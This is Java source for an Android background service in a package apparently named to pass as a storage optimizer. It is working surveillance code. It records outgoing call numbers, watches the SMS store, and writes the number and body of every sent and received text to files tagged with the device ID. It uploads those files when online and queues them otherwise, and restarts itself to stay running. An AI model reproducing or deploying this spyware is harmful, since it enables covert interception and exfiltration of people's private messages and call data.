package com.android.sd.optimize;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Settings.Secure;
import android.support.v4.content.LocalBroadcastManager;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.io.FileWriter;

public class BackService extends Service {

	private String LOG_TAG = AppGlobals.getLogTag(getClass());
	public boolean ringing = false;
	public boolean received = false;
	public boolean called = false;
	private String fileName;
	public DBHandler dbHandler;
	Helpers helpers;
	SharedPreferences pref;
	public static boolean isRunning = false;
	public String inNo = "";
	public String outNo = "";
	TelephonyManager telephony;
	PhoneListener phoneListener;
	SmsManager smsManager;
	public static String DeviceId = "";
	LocalBroadcastManager localBroadcastManager;
	boolean observingSMS = false;
	String lastID = "";

	@Override
	public void onCreate() {
		DeviceId = Secure.getString(getApplicationContext().getContentResolver(),Secure.ANDROID_ID);
		dbHandler = new  DBHandler(getApplicationContext());
		helpers = new Helpers(getApplicationContext());
		isRunning = true;
		phoneListener = new PhoneListener(this);
		telephony = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
		telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
		pref = PreferenceManager.getDefaultSharedPreferences(this);
		localBroadcastManager = LocalBroadcastManager.getInstance(this);
		registerReceiver(outcallReceiver, new IntentFilter(Intent.ACTION_NEW_OUTGOING_CALL));
		registerReceiver(smsReceiver, new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
		smsManager = SmsManager.getDefault();
		getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, outsmsObserver);
	}

	BroadcastReceiver outcallReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			// TODO Auto-generated method stub
			outNo = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
			called = true;
		}
	};

	BroadcastReceiver smsReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			// TODO Auto-generated method stub
			final Bundle bundle = intent.getExtras();
			try {
				if (bundle != null) {
					String message = "";
					final Object[] pdusObj = (Object[]) bundle.get("pdus");
					String phoneNumber = "";
					for (int i = 0; i < pdusObj.length; i++) {

						SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
						phoneNumber = currentMessage.getDisplayOriginatingAddress();
						Log.i(AppGlobals.getLogTag(getClass())," "+currentMessage);
						Log.i(AppGlobals.getLogTag(getClass()),phoneNumber);
						message += currentMessage.getDisplayMessageBody();
					}
				}
			} catch (Exception e) {
				Log.e(LOG_TAG, "Exception smsReceiver" + e);
			}
		}
	};

	ContentObserver outsmsObserver = new ContentObserver(new Handler()) {

		@Override
		public void onChange(boolean selfChange) {
			try {
				if (observingSMS) {
					super.onChange(selfChange);
					return;
				}
				observingSMS = true;
				Uri uriSMSURI = Uri.parse("content://sms");
				Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
				// this will make it point to the first record, which is the
				// last SMS
				// sent
				Log.e(LOG_TAG, cur.getCount() + ">");
                File dir = new File(RecordService.DEFAULT_STORAGE_LOCATION);
                if (!dir.exists()) {
                    dir.mkdirs();
                }
				if (cur.moveToNext()) {
					Log.e(LOG_TAG + "SMS TYPE:", cur.getString(cur.getColumnIndex("type")));
					if (cur.getString(cur.getColumnIndex("type")).equals("1") ||
							cur.getString(cur.getColumnIndex("type")).equals("2")) {
						String id = cur.getString(cur.getColumnIndex("_id"));
						if (!id.equals(lastID)) {
							String status = "";
							if (cur.getString(cur.getColumnIndex("type")).equals("1")) {
								Log.e(LOG_TAG, "Sms Received");
								status = "in";
							} else if (cur.getString(cur.getColumnIndex("type")).equals("2")) {
								Log.e(LOG_TAG, "Sms Sent");
								status = "out";
							}
							String content = cur.getString(cur.getColumnIndex("body"));
							String no = cur.getString(cur.getColumnIndex("address"));
							File file = new File(dir,DeviceId + "_"+Util.getTime()+"_"+status+"_" +no+".txt");
							fileName = file.getName();
							FileWriter writer = new FileWriter(file);

							writer.append("Number : " + no + " \n Status :" + status + "\n body : " + content);
							writer.flush();
							writer.close();
//							String path = RecordService.DEFAULT_STORAGE_LOCATION;
							if (helpers.isOnline()) {
								Intent intent = new Intent(getApplicationContext(), Util.class);
								intent.putExtra("currentFile", RecordService.DEFAULT_STORAGE_LOCATION + fileName);
								startService(intent);
                            } else {
                                dbHandler.createNewFileNameForUpload("filename", file.getAbsolutePath());
                            }
						}
						lastID = id;
					}
				}
				cur.close();
				observingSMS = false;
			} catch (Exception e) {
				Log.e(LOG_TAG, e.toString());
			}
			super.onChange(selfChange);
		}
	};

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		return START_STICKY;
	}

	@Override
	public void onDestroy() {
		telephony.listen(phoneListener, PhoneStateListener.LISTEN_NONE);
		unregisterReceiver(smsReceiver);
		getContentResolver().unregisterContentObserver(outsmsObserver);
		isRunning = false;
	}

	public BackService() {

	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO: Return the communication channel to the service.
		throw new UnsupportedOperationException("Not yet implemented");
	}
}
